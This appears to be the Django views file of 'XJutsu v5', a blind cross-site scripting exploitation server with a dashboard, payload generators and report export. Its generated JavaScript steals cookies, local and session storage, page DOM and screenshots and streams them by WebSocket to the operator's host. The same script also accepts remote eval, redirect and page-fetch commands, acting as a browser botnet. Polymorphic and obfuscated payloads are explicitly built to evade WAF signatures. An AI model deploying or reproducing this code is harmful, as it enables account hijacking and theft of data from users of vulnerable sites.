"""
XJutsu v5 - Views
Dashboard and API endpoints
"""

import json
import uuid
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib.auth import login, authenticate
from django.contrib import messages
from django.http import JsonResponse, HttpResponse, HttpResponseForbidden
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.utils import timezone
from django.conf import settings
from django.db.models import Count
from django.db.models.functions import TruncDate

from .models import Capture, Payload, CollectedPage, WebhookConfig, APIKey, PayloadToken, PayloadLibrary
from .obfuscator import PayloadObfuscator
from .commands import BotCommander
from .geoip import GeoIPService
from .tokens import TokenService, RateLimiter
from .polymorphic import PolymorphicEngine
from .engines.polymorph import PolymorphicMutator, BrowserDetector, generate_full


# ============== Smart Root Endpoint ==============

@csrf_exempt
def smart_root(request):
    """
    Smart root endpoint - serves JS when loaded as script, otherwise redirects to dashboard
    This enables shortest payload: <script src=//6u.gg></script>
    Also handles import('//6u.gg') which sets Sec-Fetch-Dest: empty
    """
    # Check if this is a script request (loaded via <script src> or import())
    accept_header = request.META.get('HTTP_ACCEPT', '')
    sec_fetch_dest = request.META.get('HTTP_SEC_FETCH_DEST', '')
    sec_fetch_mode = request.META.get('HTTP_SEC_FETCH_MODE', '')

    # Detect script/module loading:
    # 1. Sec-Fetch-Dest: script (classic <script src>)
    # 2. Sec-Fetch-Dest: empty + Sec-Fetch-Mode: cors (dynamic import())
    # 3. Accept contains */*, no text/html (older browsers)
    # 4. No Accept header at all (some script requests)
    # 5. Force via ?js=1 query param
    is_script_request = (
        sec_fetch_dest == 'script' or
        sec_fetch_dest == 'empty' or  # import() / fetch()
        (accept_header and 'text/html' not in accept_header and '*/*' in accept_header) or
        (not accept_header) or
        request.GET.get('js') == '1'  # Force JS via ?js=1
    )

    if is_script_request:
        # For import(), serve as module
        if sec_fetch_dest == 'empty' and sec_fetch_mode == 'cors':
            return serve_module_js(request)
        return serve_payload_js(request)

    # Otherwise redirect to dashboard (requires login)
    if request.user.is_authenticated:
        return redirect('dashboard')
    return redirect('login')


# ============== Dashboard Views ==============

@login_required
def dashboard(request):
    """
    Main dashboard view
    """
    # Get stats
    total_captures = Capture.objects.count()
    new_captures = Capture.objects.filter(status='new').count()
    active_payloads = Payload.objects.filter(user=request.user, is_active=True).count()
    
    # Recent captures
    recent_captures = Capture.objects.select_related('payload')[:10]
    
    # Captures by day (last 7 days)
    from datetime import timedelta
    week_ago = timezone.now() - timedelta(days=7)
    captures_by_day = (
        Capture.objects
        .filter(fired_at__gte=week_ago)
        .annotate(date=TruncDate('fired_at'))
        .values('date')
        .annotate(count=Count('id'))
        .order_by('date')
    )
    
    # Top domains
    top_domains = (
        Capture.objects
        .values('origin')
        .annotate(count=Count('id'))
        .order_by('-count')[:5]
    )
    
    context = {
        'total_captures': total_captures,
        'new_captures': new_captures,
        'active_payloads': active_payloads,
        'recent_captures': recent_captures,
        'captures_by_day': list(captures_by_day),
        'top_domains': top_domains,
        'server_url': f"{request.scheme}://{request.get_host()}",
    }
    
    return render(request, 'hunter/dashboard.html', context)


@login_required
def captures_list(request):
    """
    List all captures with filtering
    """
    captures = Capture.objects.select_related('payload').all()
    
    # Filter by status
    status = request.GET.get('status')
    if status:
        captures = captures.filter(status=status)
    
    # Filter by payload
    payload_id = request.GET.get('payload')
    if payload_id:
        captures = captures.filter(payload_id=payload_id)
    
    # Search
    search = request.GET.get('search')
    if search:
        captures = captures.filter(uri__icontains=search)
    
    context = {
        'captures': captures[:100],
        'payloads': Payload.objects.filter(user=request.user),
        'current_status': status,
        'current_payload': payload_id,
        'search': search,
    }
    
    return render(request, 'hunter/captures_list.html', context)


@login_required
def capture_detail(request, capture_id):
    """
    View capture details
    """
    capture = get_object_or_404(Capture, id=capture_id)
    
    # Mark as viewed
    if capture.status == 'new':
        capture.status = 'viewed'
        capture.save()
    
    # Get collected pages
    collected_pages = capture.collected_pages.all()
    
    context = {
        'capture': capture,
        'collected_pages': collected_pages,
    }
    
    return render(request, 'hunter/capture_detail.html', context)


@login_required
def capture_update_status(request, capture_id):
    """
    Update capture status
    """
    if request.method == 'POST':
        capture = get_object_or_404(Capture, id=capture_id)
        new_status = request.POST.get('status')
        
        if new_status in dict(Capture.STATUS_CHOICES):
            capture.status = new_status
            capture.save()
            messages.success(request, 'Status updated!')
    
    return redirect('capture_detail', capture_id=capture_id)


@login_required
def capture_delete(request, capture_id):
    """
    Delete a capture
    """
    if request.method == 'POST':
        capture = get_object_or_404(Capture, id=capture_id)
        capture.delete()
        messages.success(request, 'Capture deleted!')
        return redirect('captures_list')
    
    return redirect('capture_detail', capture_id=capture_id)


# ============== Payload Views ==============

@login_required
def payloads_list(request):
    """
    List user's payloads
    """
    payloads = Payload.objects.filter(user=request.user)
    
    context = {
        'payloads': payloads,
        'server_url': f"{request.scheme}://{request.get_host()}",
    }
    
    return render(request, 'hunter/payloads_list.html', context)


@login_required
def payload_create(request):
    """
    Create new payload
    """
    if request.method == 'POST':
        payload = Payload.objects.create(
            user=request.user,
            name=request.POST.get('name', 'Unnamed Payload'),
            description=request.POST.get('description', ''),
            collect_cookies=request.POST.get('collect_cookies') == 'on',
            collect_localstorage=request.POST.get('collect_localstorage') == 'on',
            collect_sessionstorage=request.POST.get('collect_sessionstorage') == 'on',
            collect_dom=request.POST.get('collect_dom') == 'on',
            collect_screenshot=request.POST.get('collect_screenshot') == 'on',
            collect_urls=request.POST.get('collect_urls') == 'on',
        )
        messages.success(request, f'Payload created! ID: {payload.short_id}')
        return redirect('payload_detail', payload_id=payload.id)
    
    return render(request, 'hunter/payload_create.html')


@login_required
def payload_detail(request, payload_id):
    """
    View payload details and generated code
    """
    payload = get_object_or_404(Payload, id=payload_id, user=request.user)
    server_url = f"{request.scheme}://{request.get_host()}"
    
    context = {
        'payload': payload,
        'server_url': server_url,
        'captures': payload.captures.all()[:10],
    }
    
    return render(request, 'hunter/payload_detail.html', context)


@login_required
def payload_delete(request, payload_id):
    """
    Delete a payload
    """
    if request.method == 'POST':
        payload = get_object_or_404(Payload, id=payload_id, user=request.user)
        payload.delete()
        messages.success(request, 'Payload deleted!')
    
    return redirect('payloads_list')


# ============== Settings Views ==============

@login_required
def settings_view(request):
    """
    User settings page
    """
    webhooks = WebhookConfig.objects.filter(user=request.user)
    api_keys = APIKey.objects.filter(user=request.user)
    
    context = {
        'webhooks': webhooks,
        'api_keys': api_keys,
    }
    
    return render(request, 'hunter/settings.html', context)


@login_required
def webhook_create(request):
    """
    Create webhook
    """
    if request.method == 'POST':
        WebhookConfig.objects.create(
            user=request.user,
            name=request.POST.get('name'),
            webhook_type=request.POST.get('webhook_type'),
            webhook_url=request.POST.get('webhook_url'),
            telegram_chat_id=request.POST.get('telegram_chat_id', ''),
        )
        messages.success(request, 'Webhook created!')
    
    return redirect('settings')


@login_required
def api_key_create(request):
    """
    Create API key
    """
    if request.method == 'POST':
        api_key = APIKey.objects.create(
            user=request.user,
            name=request.POST.get('name', 'API Key'),
        )
        messages.success(request, f'API Key created: {api_key.key}')
    
    return redirect('settings')


# ============== Payload Serving ==============

@csrf_exempt
@require_http_methods(["GET", "OPTIONS"])
def serve_payload_js(request, payload_id=None):
    """
    Serve the XSS payload JavaScript
    Supports optional token validation for single-use payloads
    """
    # Handle CORS preflight
    if request.method == 'OPTIONS':
        response = HttpResponse()
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
        response['Access-Control-Allow-Headers'] = '*'
        return response

    # Get client IP for rate limiting
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        client_ip = x_forwarded_for.split(',')[0].strip()
    else:
        client_ip = request.META.get('REMOTE_ADDR')

    # Rate limiting (10 requests per minute per IP)
    rate_key = RateLimiter.get_client_key(request, 'payload')
    is_allowed, remaining, reset_time = RateLimiter.check_rate_limit(rate_key, max_requests=60, window_seconds=60)

    if not is_allowed:
        response = HttpResponse('// Rate limited', content_type='application/javascript', status=429)
        response['Retry-After'] = str(int(reset_time - timezone.now().timestamp()))
        return response

    # Check for token-based validation (optional)
    token = request.GET.get('t') or request.GET.get('token')
    if token:
        # Try HMAC token first
        is_valid, token_payload_id, error = TokenService.verify_token(token)
        if is_valid:
            payload_id = token_payload_id or payload_id
        else:
            # Try database token
            try:
                db_token = PayloadToken.objects.get(token=token)
                if db_token.is_valid:
                    payload_id = str(db_token.payload_id) if db_token.payload else payload_id
                    db_token.mark_used(client_ip)
                else:
                    response = HttpResponse('// Token expired or used', content_type='application/javascript', status=403)
                    response['Access-Control-Allow-Origin'] = '*'
                    return response
            except PayloadToken.DoesNotExist:
                # Invalid token - still serve default payload for flexibility
                pass

    # Get short domain from settings or request host
    short_domain = getattr(settings, 'SHORT_DOMAIN', None) or request.get_host()
    server_url = f"{request.scheme}://{short_domain}"
    ws_protocol = 'wss' if request.is_secure() else 'ws'
    ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"

    # Check for polymorphic mode (unique payload every request)
    poly_mode = request.GET.get('poly') or request.GET.get('p')

    # Generate the payload JavaScript
    if poly_mode:
        # Polymorphic: unique code structure every request
        js_content = PolymorphicEngine.generate_payload_js(server_url, ws_url, payload_id)
    else:
        # Standard payload
        js_content = generate_payload_js(server_url, ws_url, payload_id)

    response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
    response['Access-Control-Allow-Origin'] = '*'
    response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
    response['Access-Control-Allow-Headers'] = '*'
    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response['X-Content-Type-Options'] = 'nosniff'

    return response


@csrf_exempt
@require_http_methods(["GET", "OPTIONS"])
def serve_module_js(request, module_name=None):
    """
    Serve JavaScript as ES module (requires CORS for import())
    Endpoint: /m/<module>.js or /module/<module>.js
    """
    if request.method == 'OPTIONS':
        response = HttpResponse()
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
        response['Access-Control-Allow-Headers'] = '*'
        return response

    short_domain = getattr(settings, 'SHORT_DOMAIN', None) or request.get_host()
    server_url = f"{request.scheme}://{short_domain}"
    ws_protocol = 'wss' if request.is_secure() else 'ws'
    ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"

    # Check for polymorphic mode
    poly_mode = request.GET.get('poly') or request.GET.get('p')

    # ES Module format (polymorphic by default for import())
    if poly_mode or True:  # Always polymorphic for modules
        js_content = PolymorphicEngine.generate_module_js(server_url, ws_url)
    else:
        js_content = generate_module_js(server_url, ws_url)

    response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
    response['Access-Control-Allow-Origin'] = '*'
    response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
    response['Access-Control-Allow-Headers'] = '*'
    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response['X-Content-Type-Options'] = 'nosniff'

    return response


@csrf_exempt
@require_http_methods(["GET", "OPTIONS"])
def poly_js(request):
    """
    Advanced Polymorphic Payload Endpoint
    Every request generates a unique, mutated payload to evade WAF signatures

    Usage:
        <script src=//6u.gg/poly.js></script>
        <script src=//6u.gg/poly.js?b=chrome></script>  (browser-specific)
        <script src=//6u.gg/poly.js?c=b64,hex></script>  (encoding chain)
    """
    if request.method == 'OPTIONS':
        response = HttpResponse()
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
        response['Access-Control-Allow-Headers'] = '*'
        return response

    # Get client info
    user_agent = request.META.get('HTTP_USER_AGENT', '')

    # Rate limiting
    rate_key = RateLimiter.get_client_key(request, 'poly')
    is_allowed, remaining, reset_time = RateLimiter.check_rate_limit(rate_key, max_requests=120, window_seconds=60)

    if not is_allowed:
        response = HttpResponse('// Rate limited', content_type='application/javascript', status=429)
        response['Retry-After'] = str(int(reset_time - timezone.now().timestamp()))
        return response

    # Get settings
    short_domain = getattr(settings, 'SHORT_DOMAIN', None) or request.get_host()
    server_url = f"{request.scheme}://{short_domain}"
    ws_protocol = 'wss' if request.is_secure() else 'ws'
    ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"

    # Optional parameters
    browser = request.GET.get('b') or request.GET.get('browser')
    chain = request.GET.get('c') or request.GET.get('chain')
    payload_id = request.GET.get('p') or request.GET.get('payload')
    token = request.GET.get('t') or request.GET.get('token')

    # Initialize mutator
    mutator = PolymorphicMutator()

    # Generate payload based on parameters
    if browser:
        # Browser-specific payload
        js_content = mutator.generate_for_browser(browser, short_domain, token)
    elif chain:
        # Chained encoding
        chain_list = chain.split(',')
        js_content = mutator.generate_chained(short_domain, token, chain_list)
    else:
        # Full polymorphic payload with browser detection
        detected_browser = BrowserDetector.detect(user_agent)
        js_content = mutator.generate_full_payload(server_url, ws_url, payload_id, user_agent)

    response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
    response['Access-Control-Allow-Origin'] = '*'
    response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
    response['Access-Control-Allow-Headers'] = '*'
    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response['X-Content-Type-Options'] = 'nosniff'
    # Add unique ID header for debugging
    response['X-Poly-ID'] = TokenService.generate_token()[:16]

    return response


def generate_module_js(server_url, ws_url):
    """
    Generate ES Module version of payload (for import() calls)
    """
    return f'''// XJutsu v5 - ES Module Payload
const config = {{
    serverUrl: "{server_url}",
    wsUrl: "{ws_url}",
    botId: Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2)
}};

const connect = () => {{
    const ws = new WebSocket(config.wsUrl);
    ws.onopen = () => {{
        ws.send(JSON.stringify({{ type: 'register', bot_id: config.botId }}));
        ws.send(JSON.stringify({{
            type: 'callback',
            payload: {{
                bot_id: config.botId,
                uri: location.href,
                origin: location.origin,
                referrer: document.referrer,
                cookies: document.cookie,
                localstorage: Object.fromEntries(Object.keys(localStorage).map(k => [k, localStorage[k]])),
                sessionstorage: Object.fromEntries(Object.keys(sessionStorage).map(k => [k, sessionStorage[k]])),
                dom: document.documentElement.outerHTML.slice(0, 50000),
                user_agent: navigator.userAgent,
                browser_info: {{ platform: navigator.platform, language: navigator.language }}
            }}
        }}));
    }};
}};

connect();
export default config;
'''


def generate_payload_js(server_url, ws_url, payload_id=None):
    """
    Generate the XSS payload JavaScript code
    """
    return f'''
// XJutsu v5 - XSS Payload
(function() {{
    if (window.__xjutsu_loaded) return;
    window.__xjutsu_loaded = true;
    
    var config = {{
        serverUrl: "{server_url}",
        wsUrl: "{ws_url}",
        payloadId: "{payload_id or ''}",
        botId: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
    }};
    
    var ws = null;
    var reconnectAttempts = 0;
    var maxReconnectAttempts = 10;
    
    function connect() {{
        ws = new WebSocket(config.wsUrl);
        
        ws.onopen = function() {{
            console.log('[XJutsu] Connected');
            reconnectAttempts = 0;
            
            // Register bot
            ws.send(JSON.stringify({{
                type: 'register',
                bot_id: config.botId
            }}));
            
            // Send initial callback
            sendCallback();
        }};
        
        ws.onmessage = function(event) {{
            try {{
                var data = JSON.parse(event.data);
                handleCommand(data);
            }} catch(e) {{}}
        }};
        
        ws.onclose = function() {{
            if (reconnectAttempts < maxReconnectAttempts) {{
                reconnectAttempts++;
                setTimeout(connect, 1000 * reconnectAttempts);
            }}
        }};
        
        ws.onerror = function() {{}};
    }}
    
    function sendCallback() {{
        var data = {{
            type: 'callback',
            payload: {{
                payload_id: config.payloadId,
                bot_id: config.botId,
                uri: window.location.href,
                origin: window.location.origin,
                referrer: document.referrer,
                cookies: document.cookie,
                localstorage: getStorage(localStorage),
                sessionstorage: getStorage(sessionStorage),
                dom: document.documentElement.outerHTML.substring(0, 50000),
                page_links: getPageLinks(),
                user_agent: navigator.userAgent,
                browser_info: getBrowserInfo()
            }}
        }};
        
        if (ws && ws.readyState === WebSocket.OPEN) {{
            ws.send(JSON.stringify(data));
        }}
        
        // Capture screenshot
        setTimeout(captureScreenshot, 1000);
    }}
    
    function getStorage(storage) {{
        var data = {{}};
        try {{
            for (var i = 0; i < storage.length; i++) {{
                var key = storage.key(i);
                data[key] = storage.getItem(key);
            }}
        }} catch(e) {{}}
        return data;
    }}
    
    function getPageLinks() {{
        var links = [];
        var anchors = document.getElementsByTagName('a');
        for (var i = 0; i < anchors.length && i < 100; i++) {{
            if (anchors[i].href) links.push(anchors[i].href);
        }}
        return links;
    }}
    
    function getBrowserInfo() {{
        return {{
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            screenWidth: screen.width,
            screenHeight: screen.height,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight
        }};
    }}
    
    function captureScreenshot() {{
        // Using html2canvas if available, otherwise skip
        if (typeof html2canvas !== 'undefined') {{
            html2canvas(document.body).then(function(canvas) {{
                var screenshot = canvas.toDataURL('image/png', 0.5);
                if (ws && ws.readyState === WebSocket.OPEN) {{
                    ws.send(JSON.stringify({{
                        type: 'screenshot',
                        capture_id: config.botId,
                        screenshot: screenshot
                    }}));
                }}
            }});
        }} else {{
            // Load html2canvas dynamically
            var script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = function() {{
                setTimeout(captureScreenshot, 500);
            }};
            document.head.appendChild(script);
        }}
    }}
    
    function handleCommand(data) {{
        if (data.type === 'command') {{
            switch(data.command) {{
                case 'eval':
                    try {{ eval(data.args.code); }} catch(e) {{}}
                    break;
                case 'redirect':
                    window.location.href = data.args.url;
                    break;
                case 'collect_page':
                    collectPage(data.args.url);
                    break;
                case 'screenshot':
                    captureScreenshot();
                    break;
            }}
        }}
    }}
    
    function collectPage(url) {{
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {{
            if (xhr.readyState === 4) {{
                if (ws && ws.readyState === WebSocket.OPEN) {{
                    ws.send(JSON.stringify({{
                        type: 'page_collect',
                        capture_id: config.botId,
                        uri: url,
                        html: xhr.responseText
                    }}));
                }}
            }}
        }};
        xhr.open('GET', url, true);
        xhr.send();
    }}
    
    // Start connection
    connect();
}})();
'''


# ============== API Endpoints ==============

@csrf_exempt
@require_http_methods(["POST", "OPTIONS"])
def api_callback(request):
    """
    HTTP callback endpoint (fallback if WebSocket fails)
    """
    if request.method == 'OPTIONS':
        response = HttpResponse()
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        response['Access-Control-Allow-Headers'] = '*'
        return response
    
    try:
        data = json.loads(request.body)
        
        # Get client IP
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        # Get GeoIP data
        geo = GeoIPService.lookup(ip) if ip else {}
        
        # Create capture
        capture = Capture.objects.create(
            bot_id=data.get('bot_id', str(uuid.uuid4())[:8]),
            uri=data.get('uri', ''),
            origin=data.get('origin', ''),
            referrer=data.get('referrer', ''),
            cookies=data.get('cookies', ''),
            localstorage=json.dumps(data.get('localstorage', {})),
            sessionstorage=json.dumps(data.get('sessionstorage', {})),
            dom=data.get('dom', ''),
            screenshot=data.get('screenshot', ''),
            page_links=json.dumps(data.get('page_links', [])),
            ip_address=ip,
            user_agent=data.get('user_agent', request.META.get('HTTP_USER_AGENT', '')),
            browser_info=json.dumps(data.get('browser_info', {})),
            country=geo.get('country', ''),
            city=geo.get('city', ''),
            geolocation=f"{geo.get('lat', '')},{geo.get('lon', '')}" if geo.get('lat') else '',
        )
        
        response = JsonResponse({
            'status': 'success',
            'capture_id': str(capture.id)
        })
        
    except Exception as e:
        response = JsonResponse({
            'status': 'error',
            'message': str(e)
        }, status=400)
    
    response['Access-Control-Allow-Origin'] = '*'
    return response


# ============== Payload Generator ==============

@login_required
def payload_generator(request):
    """
    Advanced payload generator with obfuscation
    """
    server_url = f"{request.scheme}://{request.get_host()}"
    payloads = PayloadObfuscator.generate_all_payloads(server_url)
    
    context = {
        'payloads': payloads,
        'server_url': server_url,
    }
    
    return render(request, 'hunter/payload_generator.html', context)


@login_required
def generate_custom_payload(request):
    """
    Generate payload with custom options (AJAX endpoint)
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        
        server_url = f"{request.scheme}://{request.get_host()}"
        payload_id = data.get('payload_id')
        encoding = data.get('encoding', 'none')
        context = data.get('context', 'html_tag')
        
        if payload_id:
            js_url = f"{server_url}/p/{payload_id}.js"
        else:
            js_url = f"{server_url}/x.js"
        
        base_script = f"var s=document.createElement('script');s.src='{js_url}';document.head.appendChild(s)"
        
        # Apply encoding
        if encoding == 'base64':
            result = PayloadObfuscator.base64_encode(base_script)
            result = f'<script>{result}</script>'
        elif encoding == 'charcode':
            result = f'<script>eval({PayloadObfuscator.charcode_encode(base_script)})</script>'
        elif encoding == 'url':
            result = PayloadObfuscator.url_encode(f'<script src="{js_url}"></script>')
        elif encoding == 'html_entity':
            result = PayloadObfuscator.html_entity_encode(f'<script src="{js_url}"></script>')
        elif encoding == 'constructor':
            result = f'<script>{PayloadObfuscator.constructor_method(base_script)}</script>'
        elif encoding == 'polyglot':
            result = PayloadObfuscator.generate_polyglot(js_url)
        else:
            result = PayloadObfuscator.get_payload_for_context(context, server_url, payload_id)
        
        return JsonResponse({'payload': result})
    
    return JsonResponse({'error': 'POST required'}, status=400)


# ============== Bot Commands ==============

@login_required
def bot_commander(request):
    """
    Bot commander interface
    """
    # Get recent captures with bot_ids (active sessions)
    recent_bots = Capture.objects.values('bot_id').distinct()[:20]
    commands = BotCommander.get_available_commands()
    
    context = {
        'recent_bots': recent_bots,
        'commands': commands,
    }
    
    return render(request, 'hunter/bot_commander.html', context)


@login_required
@require_http_methods(["POST"])
def send_bot_command(request):
    """
    Send command to bot (AJAX endpoint)
    """
    try:
        data = json.loads(request.body)
        bot_id = data.get('bot_id')
        command = data.get('command')
        args = data.get('args', {})

        if not bot_id or not command:
            return JsonResponse({'error': 'bot_id and command required'}, status=400)

        success = BotCommander.send_command(bot_id, command, args)

        return JsonResponse({
            'status': 'success' if success else 'error',
            'message': f"Command '{command}' sent to {bot_id}" if success else 'Failed to send command'
        })

    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)


# ============== Payload Library ==============

@login_required
def payload_library(request):
    """
    Display payload library organized by category
    """
    from django.db.models import Count

    # Get payloads grouped by category
    categories = PayloadLibrary.CATEGORY_CHOICES
    library = {}

    for cat_key, cat_name in categories:
        payloads = PayloadLibrary.objects.filter(category=cat_key, is_active=True)
        if payloads.exists():
            library[cat_key] = {
                'name': cat_name,
                'payloads': payloads
            }

    # Get short domain for template placeholders
    short_domain = getattr(settings, 'SHORT_DOMAIN', request.get_host())

    context = {
        'library': library,
        'short_domain': short_domain,
        'total_payloads': PayloadLibrary.objects.filter(is_active=True).count(),
    }

    return render(request, 'hunter/payload_library.html', context)


@login_required
def generate_token(request):
    """
    Generate a new payload token (AJAX endpoint)
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        payload_id = data.get('payload_id')
        expires_minutes = data.get('expires_minutes', 60)
        max_uses = data.get('max_uses', 1)

        # Generate HMAC token
        token = TokenService.generate_token(payload_id, expires_minutes)

        # Also store in DB for tracking
        db_token = PayloadToken.objects.create(
            payload_id=payload_id if payload_id else None,
            token=token,
            max_uses=max_uses,
            expires_at=timezone.now() + timezone.timedelta(minutes=expires_minutes)
        )

        short_domain = getattr(settings, 'SHORT_DOMAIN', request.get_host())

        return JsonResponse({
            'token': token,
            'payload_url': f"//{short_domain}?t={token}",
            'script_tag': f'<script src=//{short_domain}?t={token}></script>',
            'expires_at': db_token.expires_at.isoformat(),
        })

    return JsonResponse({'error': 'POST required'}, status=400)


# ============== Reports ==============

@login_required
def reports_list(request):
    """
    List all scans and domains for reporting
    """
    from .models import ScanTarget, ScanInjectionPoint

    # Get all scans
    scans = ScanTarget.objects.all()

    # Get unique domains from captures
    domains = (
        Capture.objects
        .values('origin')
        .annotate(count=Count('id'))
        .order_by('-count')
    )

    # Get verified XSS counts
    verified_by_domain = {}
    for scan in scans:
        if scan.verified_xss > 0:
            verified_by_domain[scan.target_domain] = verified_by_domain.get(scan.target_domain, 0) + scan.verified_xss

    context = {
        'scans': scans,
        'domains': domains,
        'verified_by_domain': verified_by_domain,
    }

    return render(request, 'hunter/reports_list.html', context)


@login_required
def report_by_domain(request, domain):
    """
    Generate report for a specific domain
    """
    from .models import ScanTarget, ScanInjectionPoint
    from .reports import ReportGenerator

    # Get captures for this domain
    captures = Capture.objects.filter(origin__icontains=domain)

    # Get injection points for this domain
    injection_points = ScanInjectionPoint.objects.filter(url__icontains=domain)

    # Get format
    fmt = request.GET.get('format', 'html')

    if fmt == 'markdown' or fmt == 'md':
        # Generate markdown report
        report = ReportGenerator.generate_domain_report(
            domain=domain,
            captures=list(captures),
            injection_points=list(injection_points)
        )
        response = HttpResponse(report, content_type='text/markdown')
        response['Content-Disposition'] = f'attachment; filename="xss_report_{domain}.md"'
        return response

    elif fmt == 'json':
        # Generate JSON export
        report = ReportGenerator.export_json(
            captures=list(captures),
            injection_points=list(injection_points)
        )
        response = HttpResponse(report, content_type='application/json')
        response['Content-Disposition'] = f'attachment; filename="xss_report_{domain}.json"'
        return response

    elif fmt == 'hackerone' or fmt == 'h1':
        # Generate HackerOne format for first finding
        if injection_points.exists():
            ip = injection_points.first()
            report = ReportGenerator.generate_hackerone_format(injection_point=ip)
        elif captures.exists():
            cap = captures.first()
            report = ReportGenerator.generate_hackerone_format(capture=cap)
        else:
            report = "No findings for this domain."

        return HttpResponse(f"<pre>{report}</pre>", content_type='text/html')

    # Default: HTML view
    context = {
        'domain': domain,
        'captures': captures,
        'injection_points': injection_points,
        'verified_count': injection_points.filter(is_verified=True).count(),
        'total_captures': captures.count(),
    }

    return render(request, 'hunter/report_domain.html', context)


@login_required
def report_capture(request, capture_id):
    """
    Generate report for a single capture
    """
    from .reports import ReportGenerator

    capture = get_object_or_404(Capture, id=capture_id)
    fmt = request.GET.get('format', 'markdown')

    # Check if capture has linked injection point
    injection_point = None
    if hasattr(capture, 'injection_point') and capture.injection_point.exists():
        injection_point = capture.injection_point.first()

    if fmt == 'markdown' or fmt == 'md':
        report = ReportGenerator.generate_markdown_report(
            capture=capture,
            injection_point=injection_point
        )
        response = HttpResponse(report, content_type='text/markdown')
        response['Content-Disposition'] = f'attachment; filename="xss_report_{capture.short_id}.md"'
        return response

    elif fmt == 'hackerone' or fmt == 'h1':
        report = ReportGenerator.generate_hackerone_format(
            capture=capture,
            injection_point=injection_point
        )
        response = HttpResponse(report, content_type='text/markdown')
        response['Content-Disposition'] = f'attachment; filename="xss_h1_{capture.short_id}.md"'
        return response

    # Default: show in browser
    report = ReportGenerator.generate_markdown_report(
        capture=capture,
        injection_point=injection_point
    )
    return HttpResponse(f"<pre>{report}</pre>", content_type='text/html')


@login_required
def report_scan(request, scan_id):
    """
    Generate report for a scan
    """
    from .models import ScanTarget, ScanInjectionPoint
    from .reports import ReportGenerator

    scan = get_object_or_404(ScanTarget, id=scan_id)
    injection_points = scan.injection_points.all()

    # Get captures linked to this scan
    captures = Capture.objects.filter(
        tracking_id__in=injection_points.values_list('tracking_id', flat=True)
    )

    fmt = request.GET.get('format', 'html')

    if fmt == 'markdown' or fmt == 'md':
        report = ReportGenerator.generate_domain_report(
            domain=scan.target_domain,
            captures=list(captures),
            injection_points=list(injection_points)
        )
        response = HttpResponse(report, content_type='text/markdown')
        response['Content-Disposition'] = f'attachment; filename="scan_report_{scan.target_domain}.md"'
        return response

    elif fmt == 'json':
        report = ReportGenerator.export_json(
            captures=list(captures),
            injection_points=list(injection_points)
        )
        response = HttpResponse(report, content_type='application/json')
        response['Content-Disposition'] = f'attachment; filename="scan_report_{scan.target_domain}.json"'
        return response

    # Default: HTML view
    context = {
        'scan': scan,
        'injection_points': injection_points,
        'captures': captures,
        'verified_points': injection_points.filter(is_verified=True),
        'reflecting_points': injection_points.filter(reflects=True),
    }

    return render(request, 'hunter/report_scan.html', context)
